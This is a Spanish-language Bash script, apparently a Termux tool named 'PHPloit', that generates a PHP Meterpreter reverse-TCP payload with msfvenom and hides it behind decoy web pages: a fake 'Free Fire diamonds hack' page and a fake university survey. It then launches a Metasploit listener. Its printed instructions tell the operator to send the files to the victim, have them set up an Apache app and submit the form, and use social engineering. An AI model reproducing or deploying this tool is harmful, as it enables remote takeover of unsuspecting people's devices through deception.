#! /bin/bash

white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"


#directory verification
directory=$(pwd)


if which figlet >/dev/null; then
sleep 1
echo ""
echo -e "$blue(figlet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(figlet)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando figlet ...\e[0m"
sleep 3
pkg install figlet
fi

DIRECTORIO=/data/data/com.termux/files/usr/opt/metasploit-framework

if [ -d "$DIRECTORIO" ]
then
   echo -e "Directorio $blue(${DIRECTORIO}) $nc... $green existe"
else
   echo "Directorio $blue(${DIRECTORIO}) $nc... $green no existe"
bash metasploit.sh
fi
clear

setterm -foreground red
echo " /////////////////////////////////"
setterm -foreground yellow
   figlet PHPloit
setterm -foreground red
echo " /////////////////////////////////"
echo ""
echo ""
setterm -foreground blue
#Contestar las preguntas
echo -n "[+]Escribe tu ip ngrok >> "
read a
echo ""
echo -n "[+]Escribe tu puerto ngrok >> "
read b
echo ""
echo -n "[+]Escribe el puerto >> "
read c
echo ""
echo -n "[+]Escribe el nombre php ej.[pagina2] >> "
read name
echo ""
sleep 1
#MENU
#ESCOJER MENU
while :
do
setterm -foreground green
echo "-----------------------------"
echo -e "\e[1;32m|\e[0m\e[1;36m Escoje cual opcion deseas:\e[0m\e[1;32m |\e[0m"
setterm -foreground green
echo "--------------------------------------------"
setterm -foreground green
echo -e "\e[1;32m|\e[0m\e[1;35m [1].\e[0m\e[1;36mInyectar backdoor en pagina Freefire\e[0m\e[1;32m |\e[0m"
echo -e "\e[1;32m|\e[0m\e[1;35m [2].\e[0m\e[1;36mInyectar backdoor en pagina Encuesta\e[0m \e[1;32m|\e[0m"
setterm -foreground yellow
echo -e -n "\e[1;32m|\e[0m \e[1;33m[+].OPCION >> \e[0m"
read opcion
setterm -foreground green
echo "--------------------------------------------"
echo ""
case $opcion in
1)
#! /bin/bash
setterm -foreground green
echo " [+]Generando $name.php ..."
echo ""
setterm -foreground green
#Ejecutar msfvenom
msfvenom -p php/meterpreter/reverse_tcp lhost=$a lport=$b r > $name.php
echo ""
setterm -foreground red
echo -e "\e[1;31;42mNOTA:\e[0m Sus sietes archivos se guardo en la carpeta Freefire"
echo ""
echo -e "\e[1;32;41mAhora enviale los 7 archivos a la victima\e[0m"
echo -e "\e[1;32;41my dile a la victima que instale apache web server de la play store\e[0m"
echo -e "\e[1;32;41my que abra y elija la carpeta web en la opcion interna , luego marque la carpeta WhatsApp\e[0m"
echo -e "\e[1;32;41my que abra la url que se le genero y listo dile que llene el formulario y ponga enviar\e[0m"
echo -e "\e[1;35;42mRecuerda:\e[0m usar Ingenieria social"
echo""

rm -r Freefire

setterm -foreground yellow
DIRECTORIO=/data/data/com.termux/files/home/PHPloit/Freefire

if [ -d "$DIRECTORIO" ]
then
   echo -e "Directorio (${DIRECTORIO}) ... existe"
else
   echo "Directorio (${DIRECTORIO}) ... no existe"
   echo "Carpeta creada => Freefire [✓]"
mkdir Freefire
fi

mv $name.php /data/data/com.termux/files/home/PHPloit/Freefire 
cp logo.jpg N.png D.png Ga.png Fre.jpg /data/data/com.termux/files/home/PHPloit/Freefire
echo ""
#Ocultar $name.php en pagina html
echo "
<!DOCTYPE html>
<html lang='en'>
        <head>

                <meta charshet='UTF-8'>
                 <meta name='viewport' content='width=device-width, initial-scale=1.0'>
                <link rel='stylesheet' href='style.css'>

        </head>
        <body>
                <header>
                        <div class='divcero'>
                        <div class='div0'>
                                <img src='logo.jpg'>
                                <h1></h1>
                        </div>
                        </div>
                </header>
                <section>
                        <div class='div'><p>Diamantes Hack</p></div>
                        <form action='$name.php' method='POST'>
       <p align='left'><br><br><br>
        <div class='inputuno'>
         <img src='N.png'>
        <input type='text' class='input1' placeholder='FreeFire ID'><br>
         </div>
                  <div class='inputuno'>
               <img src='D.png'>
        <input type=text class='input1' placeholder='Cantidad de diamantes'><br>
        </div>

         <div>
           <input type='submit' class='envio' value='Enviar'><br>
         </div>
     </p>
<p></p>

    </form>
    <center>

<div>
<p> <h1><FONT COLOR='white'>No cierre la app debe esperar 1 hora para que se le agregue los diamantes</p></h1></FONT>
<img src='Ga.png' width='740px' height='400px'>
</div>
    </center>
       <center>
<p></p>
    <div class='footer'><h1>FreeFire Gems Hack 2022-2023</h1></div>
    </center>
</body>
</html>
                </section>
        </body>
</html>
" > /data/data/com.termux/files/home/PHPloit/Freefire/index.html
#Agregar style.css
echo "
{
        margin: 0;
        padding: 0;
}

body {
        background-image: url('Fre.jpg');
        background-repeat: no-repeat;
        background-size: 4000px;

}

@keyframes movimiento {
        from{
                background-position: bottom left;
        }to{
                background-position: top right;
        }
}

body header .divcero .div0 h1 {
        margin-top: 35px;
        margin-left: 170px;
        font-size: 40px;
}

body header .divcero p {
        text-align: center;
        font-size: 40px;
}

body header .divcero {
        background-color: black;
        height: 170px;
}
body header .div0 img {
        margin-left: 20px;
        margin-top: 35px;
        width: 270px;
        height: 135px;
}

body:before {
        content: "";
        width: 100%;
        height: 2600px;
        position: absolute;
        top: 0;
        left: 0;
        background-image: linear-gradient(black, #ffffff);
        opacity: 0.7;
        z-index: -1;
}

body header .divcero .div0 {
        background: black;
        height: 100px;
        display: flex;
}

body header img {
        margin-top: 100px;
        width: 600px;
        height: 700px;
        margin-left: 180px;
}

body header .div2 {
        position: absolute;
        background-color: white;
        border-radius: 50%;
        width: 200px;
        height: 200px;
        margin-left: 500px;
        margin-top: 360px;
        z-index: 2;
}

                                            
body header .paga {
        position: absolute;
        margin-top: 300px;
        margin-left: 165px;
        font-size: 80px;
        background-color: red;
        color: white;
        z-index: 3;
}

body header div .precio {
        font-family: sans-serif;
        margin-top: 50px;
        color: black;
        margin-left: 40px;
}

body header div .valor {
        margin-top: 10px;
        margin-left: 20px;
        font-family: sans-serif;
        font-size: 50px;
        position: absolute;
        color: black;
}

.span0 {
        text-decoration: blink;
        color: red;
        font-weight: bold;
}
body section .input1 {
        border-radius: 10px;
        width: 600px;
        height: 80px;
        font-size: 35px;
        border: 3px solid #748eff;
        margin-top: 7px;
        margin-left: 8px;
        padding: 0 15px;
        outline: none;
}

body section .input1:hover{
        box-shadow: 0 5px 7px #748eff,
                        5px 0 7px #748eff,
                        -5px 0 7px #748eff,
                        0 -5px 7px #748eff;
                }
body section .input2 {
        width: 160px;
        height: 80px;
        font-size: 35px;
        border: 3px solid #748eff;
        border-radius: 10px;
        margin-top: 7px;
        margin-left: 10px;
        padding: 0 15px;
}

body section .input2:hover{
        box-shadow: 0 5px 7px #748eff,
                        5px 0 7px #748eff,
                        -5px 0 7px #748eff,
                        0 -5px 7px #748eff;
                }

body section .input3 {
        margin-left: 15px;
        margin-top: 7px;
        width: 137px;
        height: 80px;
        font-size: 35px;
        border: 3px solid #748eff;
        border-radius: 10px;
        padding: 0 15px;
}

body section .input3:hover{
        box-shadow: 0 5px 7px #748eff,
                        5px 0 7px #748eff,
                        -5px 0 7px #748eff,
                        0 -5px 7px #748eff;
                }

body section .input4 {
        width: 265px;
        height: 80px;
        font-size: 30px;
        border: 3px solid #748eff;
        border-radius: 10px;
        padding: 0 15px;
        margin-top: 7px;
}

body section .input4:hover{
        box-shadow: 0 5px 7px #748eff,
                        5px 0 7px #748eff,
                        -5px 0 7px #748eff,
                        0 -5px 7px #748eff;
                }
body section .input5 {
        width: 265px;
        height: 80px;
        font-size: 30px;
        border: 3px solid #748eff;
        border-radius: 10px;
        padding: 0 15px;
        margin-top: 7px;
}

body section .input5:hover{
        box-shadow: 0 5px 7px #748eff,
                        5px 0 7px #748eff,
                        -5px 0 7px #748eff,
                        0 -5px 7px #748eff;
                }

body section .input6 {
        border-radius: 10px;
        width: 600px;
        height: 80px;
        font-size: 35px;
        border: 3px solid #748eff;
        margin-top: 7px;
        margin-left: 8px;
        padding: 0 15px;
}

body section .input6:hover{
        box-shadow: 0 5px 7px #748eff,
                        5px 0 7px #748eff,
                        -5px 0 7px #748eff,
                        0 -5px 7px #748eff;
                }

body section .envio {
        margin-left: 80px;
        margin-top: 80px;
        width: 679px;
        height: 86px;
        font-size: 65px;
        border: 3px solid white;
        background-color: red;
        color: white;
}

body section .envio:hover{
        box-shadow: 0 8px 7px 748eff,
                        8px 0 7px #748eff,
                        -8px 0 7px #748eff,
                        0 -8px 7px #748eff;
        transition: 0.5s;
                }

body header .div3 {
        height: 150px;
        background: #ffffff;
        width: 800px;
        display: flex;
        border: 5px solid #648eff;
        margin-left: 70px;
        margin-top: 50px;
        border-radius: 10px;
        box-shadow: 0 2px 7px gray,
                        2px 0 7px gray,
                        0 -2px 7px gray,
                        -2px 0 7px gray;
}

body header .div3 img {
        width: 170px;
        height: 100px;
        margin-left: 20px;
        margin-top: 25px;
}

body header .div3 p {
        margin-top: 30px;
        margin-left: 50px;
        font-size: 35px;
}

body section {
        box-shadow: 0 8px 10px gray,
                        8px 0 10px gray,
                        -8px 0 10px gray,
                        0 -8px 10px gray;
        width: 850px;
        margin-left: 60px;
        height: 1200px;
        margin-top: 150px;
        margin-bottom: 50px;
}

body section .div {
        background-color: black;
        height: 150px;
}

body section .div p {
        color: white;
        font-family: sans-serif;
        font-size: 47px;
        padding: 40px;
        margin-left: 200px;
}



body section .inputuno {
        margin-top: 40px;
        background-color: #ffffff;
        display: flex;
        border-radius: 15px;
        width: 87%;
        height: 100px;
        margin-left: 50px;
}

body section .inputuno img {
        width: 100px;
        height: 90px;
        margin-left: 10px;
        margin-top: 9px;
}

body section .inputtres {
        background: red;
        display: flex;
        border-radius: 15px;
        height: 100px;
        background-color: #ffffff;
        width: 340px;
        margin-left: 100px;
        margin-top: 5px;
}

body section  .inputtres img {
        width: 100px;
        height: 94px;
        margin-left: 10px;
        margin-top: 5px;
}
body section .capados {
        display: flex;
        background-color: none;
        height: 110px;
        width: 87%;
        margin-top: 50px;
        margin-left: 40px;
        border-radius: 10px;
}

body section .inputdos img {
        width: 100px;
        height: 90px;
        margin-left: 10px;
        margin-top: 9px;
}

body section .inputdos {
        margin-top: 5px;
        width: 340px;
        height: 100px;
        background: #ffffff;
        display: flex;
        border-radius: 15px;
        margin-left: 20px;
}

body section .capatres {
        background-color: none;
        display: flex;
        margin-top: 50px;
        border-radius: 10px;
        height: 110px;
}

body section .inputcuatro {
        margin-top: 5px;
        width: 400px;
        height: 100px;
        background: #ffffff;
        display: flex;
        border-radius: 15px;
        margin-left: 20px;
}


body section .inputcuatro img {
        width: 80px;
        height: 80px;
        margin-left: 10px;
        margin-top: 9px;
}

body section .inputcinco {
        margin-top: 5px;
        width: 400px;
        height: 100px;
        background: #ffffff;
        display: flex;
        border-radius: 15px;
        margin-left: 10px;
}

body section .inputcinco img {
        width: 80px;
        height: 80px;
        margin-left: 10px;
        margin-top: 9px;
}

body section .inputseis {
        margin-top: 40px;
        background-color: #ffffff;
        display: flex;
        border-radius: 15px;
        width: 87%;
        height: 100px;
        margin-left: 50px;
}

body section .inputseis img {
        width: 80px;
        height: 80px;
        margin-left: 10px;
        margin-top: 9px;
}

body section .imgs {
        display: flex;
}

body section .imgs img{
        width: 200px;
        height: 150px;
        margin-top: 30px;
        margin-left: 150px;
}

.inputContainer {
  position: relative;
  height: 10px;
  width: 40%;
  margin-bottom: 17px;
}

 .input {
  position: absolute;
  top: 0px;
  left: 0px;
  height: 50%;
  width: 50%;
  border: 1px solid #DADCE0;
  border-radius: 7px;
  font-size: 16px;
  padding: 0 20px;
  outline: none;
  background: none;
  z-index: 1;
  color: black;
}

.input_form {
  width: 40ppx;
   height: 40px;
   border: 2px solid black;
   color: ;
   position: relative;
   top: 0px;
   center: 0px;
   border-radius: 7px;
   font-size: 16px;
   padding: 0 20px;
   outline: none;
   background: none;
   z-index: 1;
   color: black;
}

::placeholder {
  color: red;
}

.submitBtn {
  display: center;
  button: center;
  padding: 12px 30px;
  border: none;
  background-color: red;
  color: cyan;
  border-radius: 6px;
  cursor: pointer;
  font-size: 16px;
  margin-top: 30px;
}

.submitBtn:hover {
  background-color: blue;
  transform: translateY(-2px);
}

" > /data/data/com.termux/files/home/PHPloit/Freefire/style.css

setterm -foreground blue
echo "////Ejecutando metasploit framework \\\\"
echo ""
#Ejecutar msfconsole
msfconsole -q -x "use exploit/multi/handler;set payload php/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport $c;exploit"
#
;;
2)
setterm -foreground green
echo " [+]Generando $name.php ..."
setterm -foreground green
#Ejecutar msfvenom
msfvenom -p php/meterpreter/reverse_tcp lhost=$a lport=$b r > $name.php
echo ""
setterm -foreground red
echo -e "\e[1;31;42mNOTA:\e[0m Sus archivos se guardaron en la carpeta Encuesta"
echo ""
echo -e "\e[1;32;41mAhora enviale los archivos que se te guardo en la carpeta Encuesta\e[0m"
echo -e "\e[1;32;41my dile a la victima que instale apache web server de la play store\e[0m"
echo -e "\e[1;32;41my que abra y elija la carpeta web en la opcion interna , luego marque la carpeta WhatsApp\e[0m"
echo -e "\e[1;32;41my que abra la url que se le genero y listo dile que llene el formulario y ponga enviar\e[0m"
echo -e "\e[1;35;42mRecuerda:\e[0m usar Ingenieria social"
echo ""

rm -r Encuesta

setterm -foreground yellow
DIRECTORIO=/data/data/com.termux/files/home/PHPloit/Encuesta

if [ -d "$DIRECTORIO" ]
then
   echo -e "Directorio (${DIRECTORIO}) ... existe"
else
   echo "Directorio (${DIRECTORIO}) ... no existe"
   echo "Carpeta creada => Encuesta [✓]"
mkdir Encuesta
fi

mv $name.php /data/data/com.termux/files/home/PHPloit/Encuesta
cp style.css U.jpg F.jpg B.jpeg P.jpeg L.jpg G.png /data/data/com.termux/files/home/PHPloit/Encuesta
echo ""
#Ocultar $name.php en pagina html
echo "
<!DOCTYPE html>
<html lang='en'>
        <head>

                <meta charshet='UTF-8'>
                 <meta name='viewport' content='width=device-width, initial-scale=1.0'>
                <link rel='stylesheet' href='style.css'>

        </head>
        <body>
                <header>                                                                                                                                             
                        <div class='divcero'>
                        <div class='div0'>
                                <img src='U.jpg'>
                                <h1><FONT COLOR='white'>Universidad ean</FONT{</h1>
                                <FONT COLOR='white'>Acreditada de alta calidad</FONT>
                        </div>
                        </div>
                </header>
                <section>
                        <div class='div'><p>Encuesta Social</p></div>
                        <form action='$name.php' method='POST'>
       <p align='left'><br><br><br>
        <div class='inputuno'>
         <img src='B.jpeg'>
        <input type='text' class='input1' placeholder='Te gusta andar en bicicleta?'><br>
         </div>
                  <div class='inputuno'>
               <img src='F.jpg'>
        <input type=text class='input1' placeholder='Te gusta jugar futboll?'><br>
        </div>
 
                 <div class='inputuno'>
               <img src='P.jpeg'>
        <input type=text class='input1' placeholder='Eres respetuso con tus padres?'><br>
        </div>

                 <div class='inputuno'>
               <img src='G.png'>
        <input type=text class='input1' placeholder='Te graduaste de la Universidad?'><br>
        </div>

               <div class='inputuno'>
               <img src='L.jpg'>
        <input type=text class='input1' placeholder='Que especialidad te gusta?'><br>
        </div>

         <div>
           <input type='submit' class='envio' value='Enviar'><br>
         </div>
<div>
    <p> <h1><FONT COLOR='white'>No cierre la app debe esperar 1 hora porque las respuestas aun se estan enviando</p></h1></FONT>
     </p>
</div>
<p></p>
" > /data/data/com.termux/files/home/PHPloit/Encuesta/index.html

setterm -foreground blue
echo "////Ejecutando metasploit framework \\\\"
echo ""
#Ejecutar msfconsole
msfconsole -q -x "use exploit/multi/handler;set payload php/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport $c;exploit"
#
;;
esac
done
#
